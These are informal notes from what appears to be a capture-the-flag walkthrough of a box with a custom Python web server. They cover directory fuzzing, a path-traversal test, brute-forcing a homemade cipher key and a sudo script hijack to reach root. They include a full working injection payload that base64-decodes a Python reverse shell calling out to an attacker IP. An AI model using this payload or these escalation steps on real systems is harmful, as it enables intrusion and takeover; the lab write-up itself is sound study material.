"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"

gobuster has some troubles. Use dirbuster and wfuzz instead, nothing

tried post, can take, but no difference.

(get hint) since we have filename, try fuzz /FUZZ/SuperSecureServer.py => /develop/SuperSecureServer.py
try ../../../../../etc/passwd and ../../../../notexist/etc/passwd, if different, has dir traversal issue.

rtfsc => lint 140, exec(); 
looks like space is not allowed and maybe url encoding will fail to exec.
local test, fix issues and find this works =>
/index.html';exec(__import__('base64').b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE0LjciLDQ0MykpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpOyBvcy5kdXAyKHMuZmlsZW5vKCksMik7cD1zdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSk7Cg=="));a='

# Priv Esc
## Get robert
find user /home/robert, files:
check.txt => 
"Encrypting this file with your key should result in out.txt, make sure your key is correct!"
out.txt, passwordreminder.txt, two binary files.
=> maybe brute forcing the key according two this two files.

also find /home/robert/BetterSSH/BetterSSH.py.

Somehow now the port 22 is open.

find /var/SuperSecureServer/, robert somehow can change its main.py, and root is running the keepalive.sh which uses main.py
possible priv esc path (?).

xxd the out.txt and passwordreminder.txt, every two bytes starts with c2 or c3. and last one is not.

I am blind! The SuperSecureCrypt.py on the desktop is not SuperSecureServer.py!! It was right in front of me!
rtfsc + bf => key is alexandrovich

used it decrypt passwordreminder.txt => SecThruObsFTW

ssh failed but su robert ok.

## Get Root
Looks like BetterSSH is own by root, but since we have robert's home dir, we can move it somewhere and create our own.
sudo -l => we can sudo BetterSSH.py
=> root
